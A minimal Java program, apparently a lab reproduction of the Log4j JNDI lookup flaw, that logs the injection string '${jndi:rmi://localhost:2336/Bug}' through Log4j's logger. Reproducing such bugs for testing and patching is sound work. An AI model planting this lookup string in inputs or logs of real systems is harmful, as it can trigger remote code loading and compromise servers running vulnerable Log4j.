package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


/**
 * Hello world!
 *
 */
public class App {
    private static final Logger logger = LogManager.getLogger(App.class);
    public static void main( String[] args )
    {
        String params = "${jndi:rmi://localhost:2336/Bug}";
        logger.error("params:{}", params);
    }
}
